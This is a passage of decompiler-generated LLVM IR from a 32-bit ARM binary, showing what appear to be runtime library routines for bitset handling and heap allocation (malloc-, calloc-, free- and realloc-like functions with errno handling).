  %v3_14010 = call i32 @function_13cd0(i8* %v2_14010, i32 0)
  ret i32 0
}

define i32 @function_1401c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1401c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1401c = load i32, i32* @r4, align 4
  store i32 %v3_1401c, i32* %stack_var_-12, align 4
  %v6_1401c = load i32, i32* @r5, align 4
  %v10_1401c = ptrtoint i32* %stack_var_-12 to i32
  %v7_14020 = icmp eq i32 %arg2, -1
  %v0_1402c.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v7_14020, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_1401c
  br label %dec_label_pc_14044

bb:                                               ; preds = %dec_label_pc_1401c
  %v2_14028 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v0_1402c.pre, i32* @r4, align 4
  %tmp19 = icmp slt i32 %v0_1402c.pre, 1
  br i1 %tmp19, label %dec_label_pc_14044, label %dec_label_pc_14034

dec_label_pc_14034:                               ; preds = %bb
  %v7_14038 = icmp sgt i32 %v0_1402c.pre, 64
  br i1 %v7_14038, label %dec_label_pc_14044, label %bb20

bb20:                                             ; preds = %dec_label_pc_14034
  store i32 %arg2, i32* %stack_var_-152, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v5_1406824 = add i32 %v10_1401c, 124
  br label %dec_label_pc_14058

dec_label_pc_14044:                               ; preds = %.thread, %dec_label_pc_14034, %bb
  %v0_14044 = call i32 @function_13c70()
  store i32 %v0_14044, i32* %r0.global-to-local, align 4
  store i32 -1, i32* @r2, align 4
  %v2_14050 = inttoptr i32 %v0_14044 to i32*
  store i32 22, i32* %v2_14050, align 4
  %v0_140c4.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_140c4

dec_label_pc_14058:                               ; preds = %bb20, %dec_label_pc_14058
  %v5_1406825 = phi i32 [ %v5_1406824, %bb20 ], [ %v5_14068, %dec_label_pc_14058 ]
  %v2_1405c = add i32 %v5_1406825, -136
  %v3_1405c = inttoptr i32 %v2_1405c to i32*
  store i32 0, i32* %v3_1405c, align 4
  %v0_14060.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_14060 = add i32 %v0_14060.pre, -1
  store i32 %v1_14060, i32* %r0.global-to-local, align 4
  %v6_14060 = icmp slt i32 %v1_14060, 0
  %v4_14068 = mul i32 %v1_14060, 4
  %v5_14068 = add i32 %v4_14068, %v10_1401c
  br i1 %v6_14060, label %dec_label_pc_14070, label %dec_label_pc_14058

dec_label_pc_14070:                               ; preds = %dec_label_pc_14058
  %v2_14070 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_14070, i32* @r5, align 4
  %v2_14074 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_14074, i32* @r0, align 4
  %v0_14078 = load i32, i32* @r4, align 4
  store i32 %v0_14078, i32* @r1, align 4
  %v0_1407c = call i32 @function_140f8()
  store i32 %v0_1407c, i32* %r0.global-to-local, align 4
  %v1_14080 = icmp slt i32 %v0_1407c, 0
  br i1 %v1_14080, label %dec_label_pc_140c0, label %dec_label_pc_14088

dec_label_pc_14088:                               ; preds = %dec_label_pc_14070
  %v0_14088 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1ee84.611 to i32), i32* %r0.global-to-local, align 4
  %v2_14090 = call i32 @function_140d4(i32 ptrtoint (i32* @global_var_1ee84.611 to i32), i32 %v0_14088)
  %v0_140a8 = load i32, i32* @r4, align 4
  store i32 %v0_140a8, i32* %r0.global-to-local, align 4
  %v4_140b0 = call i32 @function_14fc0(i32 %v0_140a8, i32* nonnull %stack_var_-152, i32 %v2_14028)
  store i32 %v4_140b0, i32* %r0.global-to-local, align 4
  %v1_140b4 = icmp slt i32 %v4_140b0, 0
  br i1 %v1_140b4, label %dec_label_pc_140c0, label %bb23

bb23:                                             ; preds = %dec_label_pc_14088
  %v5_140b8 = load i32, i32* %stack_var_-292, align 4
  store i32 %v5_140b8, i32* @r2, align 4
  br label %dec_label_pc_140c4

dec_label_pc_140c0:                               ; preds = %dec_label_pc_14088, %dec_label_pc_14070
  store i32 -1, i32* @r2, align 4
  br label %dec_label_pc_140c4

dec_label_pc_140c4:                               ; preds = %bb23, %dec_label_pc_14044, %dec_label_pc_140c0
  %v0_140c4 = phi i32 [ %v5_140b8, %bb23 ], [ %v0_140c4.pre, %dec_label_pc_14044 ], [ -1, %dec_label_pc_140c0 ]
  store i32 %v0_140c4, i32* %r0.global-to-local, align 4
  %v2_140cc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_140cc, i32* @r4, align 4
  store i32 %v6_1401c, i32* @r5, align 4
  ret i32 %v0_140c4

; uselistorder directives
  uselistorder i32 %v0_140c4, { 1, 0 }
  uselistorder i32 %v1_14060, { 0, 2, 1 }
  uselistorder i32 %v0_1402c.pre, { 1, 0, 2 }
  uselistorder i32 %v10_1401c, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %stack_var_-152, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 7, 6, 9, 8, 10, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_140c4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14058, { 1, 0 }
  uselistorder label %dec_label_pc_14044, { 1, 2, 0 }
}

define i32 @function_140d4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_140d4:
  %v1_140d4 = add i32 %arg2, -1
  %v3_140d8 = udiv i32 %v1_140d4, 32
  %v4_140dc = mul nuw nsw i32 %v3_140d8, 4
  %v5_140dc = add i32 %v4_140dc, %arg1
  %v6_140dc = inttoptr i32 %v5_140dc to i32*
  %v7_140dc = load i32, i32* %v6_140dc, align 4
  %v1_140e0 = urem i32 %v1_140d4, 32
  %v7_140e8 = shl i32 1, %v1_140e0
  %v8_140e8 = and i32 %v7_140dc, %v7_140e8
  %v10_140e8 = icmp ne i32 %v8_140e8, 0
  %. = zext i1 %v10_140e8 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_140d4, { 1, 0 }
}

define i32 @function_140f8() local_unnamed_addr {
dec_label_pc_140f8:
  %v0_140f8 = load i32, i32* @r1, align 4
  %v1_140f8 = add i32 %v0_140f8, -1
  %v3_140fc = udiv i32 %v1_140f8, 32
  store i32 %v3_140fc, i32* @ip, align 4
  %v0_14100 = load i32, i32* @r0, align 4
  %v4_14100 = mul nuw nsw i32 %v3_140fc, 4
  %v5_14100 = add i32 %v0_14100, %v4_14100
  %v6_14100 = inttoptr i32 %v5_14100 to i32*
  %v7_14100 = load i32, i32* %v6_14100, align 4
  %v1_14104 = urem i32 %v1_140f8, 32
  %v7_1410c = shl i32 1, %v1_14104
  %v8_1410c = or i32 %v7_14100, %v7_1410c
  store i32 %v8_1410c, i32* %v6_14100, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_140fc, { 1, 0 }
  uselistorder i32 %v1_140f8, { 1, 0 }
}

define i32 @function_1411c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1411c:
  %v1_1411c = add i32 %arg2, -1
  %v3_14120 = udiv i32 %v1_1411c, 32
  %v4_14124 = mul nuw nsw i32 %v3_14120, 4
  %v5_14124 = add i32 %v4_14124, %arg1
  %v6_14124 = inttoptr i32 %v5_14124 to i32*
  %v7_14124 = load i32, i32* %v6_14124, align 4
  %v1_14128 = urem i32 %v1_1411c, 32
  %tmp = shl i32 -1, %v1_14128
  %v8_14130 = add i32 %tmp, -1
  %v9_14130 = and i32 %v7_14124, %v8_14130
  store i32 %v9_14130, i32* %v6_14124, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1411c, { 1, 0 }
}

define i32 @function_14140(i32 %arg1) local_unnamed_addr {
dec_label_pc_14140:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_14140 = load i32, i32* @r4, align 4
  %v6_14140 = load i32, i32* @r5, align 4
  %v9_14140 = load i32, i32* @r6, align 4
  %v0_14144 = load i32, i32* %r0.global-to-local, align 4
  %v2_14144 = icmp eq i32 %v0_14144, 0
  %v2_14148 = ptrtoint i32* %stack_var_-20 to i32
  br i1 %v2_14144, label %bb, label %dec_label_pc_14154

bb:                                               ; preds = %dec_label_pc_14140
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1415c

dec_label_pc_14154:                               ; preds = %dec_label_pc_14140
  %tmp = icmp ugt i32 %v0_14144, -8
  br i1 %tmp, label %dec_label_pc_14260, label %dec_label_pc_1415c

dec_label_pc_1415c:                               ; preds = %bb, %dec_label_pc_14154
  %v0_1415c = phi i32 [ %v0_14144, %dec_label_pc_14154 ], [ 1, %bb ]
  %v1_1415c = add i32 %v0_1415c, 4
  store i32 %v1_1415c, i32* %stack_var_-20, align 4
  store i32 %v2_14148, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1ec74.613 to i32), i32* %r0.global-to-local, align 4
  %v1_14174 = call i32 @function_14cd4()
  store i32 ptrtoint (i32** @global_var_1ea9c.617 to i32), i32* %r0.global-to-local, align 4
  %v3_14180 = call i32 @function_144f4(i32* bitcast (i32** @global_var_1ea9c.617 to i32*), i32 %v2_14148)
  store i32 %v3_14180, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ec74.613 to i32), i32* %r0.global-to-local, align 4
  store i32 82328, i32* @lr, align 4
  %v1_14194 = call i32 @function_14cd4()
  store i32 %v1_14194, i32* %r0.global-to-local, align 4
  %v2_14198 = icmp eq i32 %v3_14180, 0
  br i1 %v2_14198, label %dec_label_pc_141a0, label %dec_label_pc_14250

dec_label_pc_141a0:                               ; preds = %dec_label_pc_1415c
  %v2_141a4 = load i32, i32* @global_var_1ec9c.620, align 4
  store i32 %v2_141a4, i32* @r4, align 4
  %v2_141a8 = load i32, i32* %stack_var_-20, align 4
  %v3_141ac = icmp ult i32 %v2_141a8, %v2_141a4
  br i1 %v3_141ac, label %.thread3, label %bb14

bb14:                                             ; preds = %dec_label_pc_141a0
  %v3_141b0 = add i32 %v2_141a4, -1
  %v2_141b4 = add i32 %v3_141b0, %v2_141a8
  %v2_141b8 = sub i32 0, %v2_141a4
  %v3_141bc = and i32 %v2_141b4, %v2_141b8
  store i32 %v3_141bc, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_141a0, %bb14
  store i32 ptrtoint (i32* @global_var_1ef04.622 to i32), i32* %r0.global-to-local, align 4
  %v1_141c8 = call i32 @function_14cd4()
  %v0_141cc = load i32, i32* @r4, align 4
  store i32 %v0_141cc, i32* %r0.global-to-local, align 4
  %v1_141d0 = call i32 @function_15488(i32 %v0_141cc)
  store i32 %v1_141d0, i32* %r0.global-to-local, align 4
  %v7_141d4 = icmp eq i32 %v1_141d0, -1
  br i1 %v7_141d4, label %bb15, label %dec_label_pc_141e0

bb15:                                             ; preds = %.thread3
  store i32 %v1_141d0, i32* @r5, align 4
  br label %dec_label_pc_141f4

dec_label_pc_141e0:                               ; preds = %.thread3
  %v1_141e0 = add i32 %v1_141d0, 3
  %v1_141e4 = and i32 %v1_141e0, -4
  store i32 %v1_141e4, i32* @r5, align 4
  %v9_141e8 = icmp eq i32 %v1_141e4, %v1_141d0
  br i1 %v9_141e8, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_141e0
  %v3_141ec = sub i32 %v1_141e4, %v1_141d0
  store i32 %v3_141ec, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_141e0, %bb16
  %v1_141f0 = xor i1 %v9_141e8, true
  call void @__pseudo_cond_branch(i1 %v1_141f0, i32 ptrtoint (i32* @global_var_15488.623 to i32))
  br label %dec_label_pc_141f4

dec_label_pc_141f4:                               ; preds = %bb15, %bb17
  store i32 ptrtoint (i32* @global_var_1ef04.622 to i32), i32* %r0.global-to-local, align 4
  store i32 82436, i32* @lr, align 4
  %v1_14200 = call i32 @function_14cd4()
  store i32 %v1_14200, i32* %r0.global-to-local, align 4
  %v0_14204 = load i32, i32* @r5, align 4
  %v7_14204 = icmp eq i32 %v0_14204, -1
  br i1 %v7_14204, label %dec_label_pc_14260, label %dec_label_pc_1420c

dec_label_pc_1420c:                               ; preds = %dec_label_pc_141f4
  store i32 ptrtoint (i32* @global_var_1ec74.613 to i32), i32* %r0.global-to-local, align 4
  %v1_14218 = call i32 @function_14cd4()
  %v0_1421c = load i32, i32* @r4, align 4
  %v0_14220 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_1ea9c.617 to i32), i32* %r0.global-to-local, align 4
  %v4_14228 = call i32 @function_14648(i32* bitcast (i32** @global_var_1ea9c.617 to i32*), i32 %v0_14220, i32 %v0_1421c)
  store i32 ptrtoint (i32** @global_var_1ea9c.617 to i32), i32* %r0.global-to-local, align 4
  %v3_14234 = call i32 @function_144f4(i32* bitcast (i32** @global_var_1ea9c.617 to i32*), i32 %v2_14148)
  store i32 %v3_14234, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ec74.613 to i32), i32* %r0.global-to-local, align 4
  store i32 82504, i32* @lr, align 4
  %v1_14244 = call i32 @function_14cd4()
  store i32 %v1_14244, i32* %r0.global-to-local, align 4
  %v2_14248 = icmp eq i32 %v3_14234, 0
  br i1 %v2_14248, label %dec_label_pc_14260, label %dec_label_pc_14250

dec_label_pc_14250:                               ; preds = %dec_label_pc_1415c, %dec_label_pc_1420c
  %v1_14254 = phi i32 [ %v3_14180, %dec_label_pc_1415c ], [ %v3_14234, %dec_label_pc_1420c ]
  %v2_14250 = load i32, i32* %stack_var_-20, align 4
  %v2_14254 = inttoptr i32 %v1_14254 to i32*
  store i32 %v2_14250, i32* %v2_14254, align 4
  %v3_14254 = load i32, i32* %r4.global-to-local, align 4
  %v4_14254 = add i32 %v3_14254, 4
  store i32 %v4_14254, i32* %r4.global-to-local, align 4
  %v2_14258 = icmp eq i32 %v4_14254, 0
  br i1 %v2_14258, label %dec_label_pc_14260, label %dec_label_pc_14270

dec_label_pc_14260:                               ; preds = %dec_label_pc_14250, %dec_label_pc_1420c, %dec_label_pc_141f4, %dec_label_pc_14154
  %v0_14260 = call i32 @function_13c70()
  store i32 %v0_14260, i32* %r0.global-to-local, align 4
  %v2_14268 = inttoptr i32 %v0_14260 to i32*
  store i32 12, i32* %v2_14268, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14270

dec_label_pc_14270:                               ; preds = %dec_label_pc_14250, %dec_label_pc_14260
  %v0_14270 = phi i32 [ %v4_14254, %dec_label_pc_14250 ], [ 0, %dec_label_pc_14260 ]
  store i32 %v0_14270, i32* %r0.global-to-local, align 4
  store i32 %v3_14140, i32* @r4, align 4
  store i32 %v6_14140, i32* @r5, align 4
  store i32 %v9_14140, i32* @r6, align 4
  ret i32 %v0_14270

; uselistorder directives
  uselistorder i32 %v0_14270, { 1, 0 }
  uselistorder i32 %v3_14234, { 1, 0, 2 }
  uselistorder i32 %v1_141e4, { 1, 0, 2 }
  uselistorder i32 %v1_141d0, { 2, 0, 4, 3, 1, 5 }
  uselistorder i32 %v3_14180, { 1, 0, 2 }
  uselistorder i32 %v0_14144, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 5, 7, 3, 6, 8, 9, 10, 2, 12, 11, 19, 14, 13, 4, 15, 16, 17, 18, 0, 1 }
  uselistorder label %dec_label_pc_14270, { 1, 0 }
  uselistorder label %dec_label_pc_14250, { 1, 0 }
  uselistorder label %dec_label_pc_141f4, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_1415c, { 1, 0 }
}

define i32 @function_14294(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14294:
  %stack_var_-12 = alloca i32, align 4
  %v3_14294 = load i32, i32* @r4, align 4
  store i32 %v3_14294, i32* %stack_var_-12, align 4
  %v6_14294 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v2_1429c = mul i32 %arg2, %arg1
  store i32 %v2_1429c, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_142a0 = icmp eq i32 %arg1, 0
  store i32 %v2_1429c, i32* @r0, align 4
  br i1 %v2_142a0, label %dec_label_pc_142cc, label %dec_label_pc_142ac

dec_label_pc_142ac:                               ; preds = %dec_label_pc_14294
  %v0_142ac = call i32 @function_132e8()
  %v0_142b0 = load i32, i32* @r5, align 4
  %v9_142b0 = icmp eq i32 %v0_142b0, %v0_142ac
  store i32 0, i32* @r5, align 4
  br i1 %v9_142b0, label %dec_label_pc_142ac.dec_label_pc_142cc_crit_edge, label %dec_label_pc_142bc

dec_label_pc_142ac.dec_label_pc_142cc_crit_edge:  ; preds = %dec_label_pc_142ac
  %v0_142cc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_142cc

dec_label_pc_142bc:                               ; preds = %dec_label_pc_142ac
  %v0_142bc = call i32 @function_13c70()
  %v2_142c4 = inttoptr i32 %v0_142bc to i32*
  store i32 12, i32* %v2_142c4, align 4
  br label %dec_label_pc_142e4

dec_label_pc_142cc:                               ; preds = %dec_label_pc_142ac.dec_label_pc_142cc_crit_edge, %dec_label_pc_14294
  %v0_142cc = phi i32 [ %v0_142cc.pre, %dec_label_pc_142ac.dec_label_pc_142cc_crit_edge ], [ %v2_1429c, %dec_label_pc_14294 ]
  %v1_142d0 = call i32 @function_14140(i32 %v0_142cc)
  store i32 %v1_142d0, i32* @r5, align 4
  store i32 82660, i32* @lr, align 4
  %v1_142e0 = icmp ne i32 %v1_142d0, 0
  call void @__pseudo_cond_branch(i1 %v1_142e0, i32 ptrtoint (i32* @global_var_13cd0.624 to i32))
  br label %dec_label_pc_142e4

dec_label_pc_142e4:                               ; preds = %dec_label_pc_142bc, %dec_label_pc_142cc
  %v0_142e4 = load i32, i32* @r5, align 4
  %v2_142e8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_142e8, i32* @r4, align 4
  store i32 %v6_14294, i32* @r5, align 4
  ret i32 %v0_142e4

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_142e4, { 1, 0 }
}

define i32 @function_142ec() local_unnamed_addr {
dec_label_pc_142ec:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_142ec = load i32, i32* @r0, align 4
  %v2_142ec = icmp eq i32 %v0_142ec, 0
  %v3_142f0 = load i32, i32* @r4, align 4
  store i32 %v3_142f0, i32* %stack_var_-24, align 4
  %v6_142f0 = load i32, i32* @r5, align 4
  %v9_142f0 = load i32, i32* @r6, align 4
  %v15_142f0 = load i32, i32* @r8, align 4
  br i1 %v2_142ec, label %bb, label %bb11

bb:                                               ; preds = %dec_label_pc_142ec
  ret i32 0

bb11:                                             ; preds = %dec_label_pc_142ec
  %v1_142f8 = add i32 %v0_142ec, -4
  %v2_142f8 = inttoptr i32 %v1_142f8 to i32*
  %v3_142f8 = load i32, i32* %v2_142f8, align 4
  store i32 %v3_142f8, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_1ea9c.617 to i32), i32* %r8.global-to-local, align 4
  store i32 %v1_142f8, i32* @r4, align 4
  %v1_14310 = call i32 @function_14cd4()
  %v0_14314 = load i32, i32* @r4, align 4
  %v0_14318 = load i32, i32* @r5, align 4
  %v4_14320 = call i32 @function_14648(i32* bitcast (i32** @global_var_1ea9c.617 to i32*), i32 %v0_14314, i32 %v0_14318)
  %v1_14328 = inttoptr i32 %v4_14320 to i32*
  %v2_14328 = load i32, i32* %v1_14328, align 4
  store i32 %v2_14328, i32* %r6.global-to-local, align 4
  %v2_1432c = load i32, i32* @global_var_1ec9c.620, align 4
  %v4_14330 = mul i32 %v2_1432c, 8
  %v6_14330 = icmp ult i32 %v2_14328, %v4_14330
  store i32 %v4_14320, i32* @r4, align 4
  br i1 %v6_14330, label %dec_label_pc_14370, label %dec_label_pc_1433c

dec_label_pc_1433c:                               ; preds = %bb11
  %v1_14344 = call i32 @function_14cd4()
  %v1_1434c = call i32 @function_15488(i32 0)
  %v0_14350 = load i32, i32* @r4, align 4
  %v1_14350 = add i32 %v0_14350, 12
  store i32 %v1_14350, i32* @r5, align 4
  %v9_14354 = icmp eq i32 %v1_14350, %v1_1434c
  br i1 %v9_14354, label %dec_label_pc_14378, label %dec_label_pc_1435c

dec_label_pc_1435c:                               ; preds = %dec_label_pc_1433c
  %v1_14368 = call i32 @function_14cd4()
  br label %dec_label_pc_14370

dec_label_pc_14370:                               ; preds = %bb11, %dec_label_pc_1435c, %bb14
  %v2_14370 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14370, i32* @r4, align 4
  store i32 %v6_142f0, i32* @r5, align 4
  store i32 %v9_142f0, i32* %r6.global-to-local, align 4
  store i32 %v15_142f0, i32* %r8.global-to-local, align 4
  %v0_14374 = call i32 @function_14cd4()
  %v0_14378.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14378

dec_label_pc_14378:                               ; preds = %dec_label_pc_1433c, %dec_label_pc_14370
  %v1_14380 = phi i32 [ %v0_14350, %dec_label_pc_1433c ], [ %v0_14378.pre, %dec_label_pc_14370 ]
  %v1_14378 = add i32 %v1_14380, 4
  %v2_14378 = inttoptr i32 %v1_14378 to i32*
  %v3_14378 = load i32, i32* %v2_14378, align 4
  %v2_1437c = icmp eq i32 %v3_14378, 0
  br i1 %v2_1437c, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_14378
  %v2_14380 = add i32 %v1_14380, 8
  %v3_14380 = inttoptr i32 %v2_14380 to i32*
  %v4_14380 = load i32, i32* %v3_14380, align 4
  %v3_14384 = add i32 %v3_14378, 8
  %v4_14384 = inttoptr i32 %v3_14384 to i32*
  store i32 %v4_14380, i32* %v4_14384, align 4
  %v0_14388.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14378, %bb12
  %v0_14388 = phi i32 [ %v1_14380, %dec_label_pc_14378 ], [ %v0_14388.pre, %bb12 ]
  %v1_14388 = add i32 %v0_14388, 8
  %v2_14388 = inttoptr i32 %v1_14388 to i32*
  %v3_14388 = load i32, i32* %v2_14388, align 4
  %v1_1438c = add i32 %v0_14388, 4
  %v2_1438c = inttoptr i32 %v1_1438c to i32*
  %v3_1438c = load i32, i32* %v2_1438c, align 4
  %v2_14390 = icmp eq i32 %v3_14388, 0
  br i1 %v2_14390, label %.thread1, label %bb13

bb13:                                             ; preds = %.thread
  %v3_14394 = add i32 %v3_14388, 4
  %v4_14394 = inttoptr i32 %v3_14394 to i32*
  store i32 %v3_1438c, i32* %v4_14394, align 4
  br label %bb14

.thread1:                                         ; preds = %.thread
  %v2_14398 = load i32, i32* %r8.global-to-local, align 4
  %v3_14398 = inttoptr i32 %v2_14398 to i32*
  store i32 %v3_1438c, i32* %v3_14398, align 4
  br label %bb14

bb14:                                             ; preds = %bb13, %.thread1
  %v1_143a8 = call i32 @function_14cd4()
  %v0_143ac = load i32, i32* %r6.global-to-local, align 4
  %v1_143ac = load i32, i32* @r4, align 4
  %v0_143b4 = load i32, i32* @r5, align 4
  %v2_143ac = sub i32 12, %v0_143ac
  %v1_143b0 = add i32 %v2_143ac, %v1_143ac
  %v2_143b4 = sub i32 %v1_143b0, %v0_143b4
  %v1_143b8 = call i32 @function_15488(i32 %v2_143b4)
  br label %dec_label_pc_14370

; uselistorder directives
  uselistorder i32 %v0_14388, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_15488, { 2, 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_14378, { 1, 0 }
  uselistorder label %dec_label_pc_14370, { 2, 1, 0 }
}

define i32 @function_143dc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_143dc:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_143dc = load i32, i32* @r4, align 4
  store i32 %v3_143dc, i32* %stack_var_-24, align 4
  %v6_143dc = load i32, i32* @r5, align 4
  %v9_143dc = load i32, i32* @r6, align 4
  %v12_143dc = load i32, i32* @r7, align 4
  %v15_143dc = load i32, i32* @r8, align 4
  %v18_143dc = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_143e0 = icmp eq i32 %arg2, 0
  %v0_143e4 = load i32, i32* @r0, align 4
  store i32 %v0_143e4, i32* @r7, align 4
  br i1 %v2_143e0, label %dec_label_pc_143ec, label %dec_label_pc_143f4

dec_label_pc_143ec:                               ; preds = %dec_label_pc_143dc
  %v0_143ec = call i32 @function_142ec()
  %v0_143fc.pre = load i32, i32* @r4, align 4
  %v2_14400.pre = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_143fc

dec_label_pc_143f4:                               ; preds = %dec_label_pc_143dc
  %v2_143f4 = icmp eq i32 %v0_143e4, 0
  br i1 %v2_143f4, label %dec_label_pc_143fc, label %dec_label_pc_14408

dec_label_pc_143fc:                               ; preds = %dec_label_pc_143f4, %dec_label_pc_143ec
  %v2_14400 = phi i32 [ %v3_143dc, %dec_label_pc_143f4 ], [ %v2_14400.pre, %dec_label_pc_143ec ]
  %v0_143fc = phi i32 [ %arg2, %dec_label_pc_143f4 ], [ %v0_143fc.pre, %dec_label_pc_143ec ]
  store i32 %v2_14400, i32* @r4, align 4
  store i32 %v6_143dc, i32* @r5, align 4
  store i32 %v9_143dc, i32* @r6, align 4
  store i32 %v12_143dc, i32* @r7, align 4
  store i32 %v18_143dc, i32* @lr, align 4
  %v1_14404 = call i32 @function_14140(i32 %v0_143fc)
  %v0_14408.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14408

dec_label_pc_14408:                               ; preds = %dec_label_pc_143f4, %dec_label_pc_143fc
  %v0_14420 = phi i32 [ %v0_143e4, %dec_label_pc_143f4 ], [ %v1_14404, %dec_label_pc_143fc ]
  %v0_14408 = phi i32 [ %arg2, %dec_label_pc_143f4 ], [ %v0_14408.pre, %dec_label_pc_143fc ]
  %v1_14408 = add i32 %v0_14408, 7
  %v1_1440c = and i32 %v1_14408, -4
  store i32 %v1_1440c, i32* @r5, align 4
  %v2_14410 = icmp ugt i32 %v1_1440c, 10
  %v1_14414 = add i32 %v0_14420, -4
  %v2_14414 = inttoptr i32 %v1_14414 to i32*
  %v3_14414 = load i32, i32* %v2_14414, align 4
  store i32 %v3_14414, i32* @r6, align 4
  br i1 %v2_14410, label %bb14, label %bb

bb:                                               ; preds = %dec_label_pc_14408
  store i32 12, i32* @r5, align 4
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_14408, %bb
  %v0_1449c = phi i32 [ %v1_1440c, %dec_label_pc_14408 ], [ 12, %bb ]
  store i32 %v1_14414, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_1449c, %v3_14414
  br i1 %tmp, label %dec_label_pc_14428, label %dec_label_pc_1449c

dec_label_pc_14428:                               ; preds = %bb14
  %v2_1441c = sub i32 %v0_1449c, %v3_14414
  %v1_14438 = call i32 @function_14cd4()
  %v0_14440 = load i32, i32* @r8, align 4
  %v1_14440 = load i32, i32* @r6, align 4
  %v2_14440 = add i32 %v1_14440, %v0_14440
  %v4_14448 = call i32 @function_14588(i32* bitcast (i32** @global_var_1ea9c.617 to i32*), i32 %v2_14440, i32 %v2_1441c)
  store i32 %v4_14448, i32* @r4, align 4
  store i32 83040, i32* @lr, align 4
  %v1_1445c = call i32 @function_14cd4()
  %v0_14460 = load i32, i32* @r4, align 4
  %v2_14460 = icmp eq i32 %v0_14460, 0
  br i1 %v2_14460, label %dec_label_pc_14470, label %.thread

.thread:                                          ; preds = %dec_label_pc_14428
  %v1_14464 = load i32, i32* @r6, align 4
  %v3_14464 = add i32 %v1_14464, %v0_14460
  %v2_14468 = load i32, i32* @r7, align 4
  %v3_14468 = add i32 %v2_14468, -4
  %v4_14468 = inttoptr i32 %v3_14468 to i32*
  store i32 %v3_14464, i32* %v4_14468, align 4
  br label %dec_label_pc_144dc

dec_label_pc_14470:                               ; preds = %dec_label_pc_14428
  %v0_14470 = load i32, i32* @r5, align 4
  %v1_14470 = add i32 %v0_14470, -4
  %v1_14474 = call i32 @function_14140(i32 %v1_14470)
  store i32 %v1_14474, i32* @r0, align 4
  store i32 %v1_14474, i32* @r4, align 4
  %v2_14478 = icmp eq i32 %v1_14474, 0
  br i1 %v2_14478, label %dec_label_pc_14494, label %dec_label_pc_14480

dec_label_pc_14480:                               ; preds = %dec_label_pc_14470
  %v0_14480 = load i32, i32* @r6, align 4
  %v1_14480 = add i32 %v0_14480, -4
  store i32 %v1_14480, i32* @r2, align 4
  %v0_14484 = load i32, i32* @r7, align 4
  store i32 %v0_14484, i32* @r1, align 4
  %v3_14488 = call i32 @function_13cb0(i32 %v1_14474, i32 %v0_14484, i32 %v1_14480)
  %v0_1448c = load i32, i32* @r7, align 4
  store i32 %v0_1448c, i32* @r0, align 4
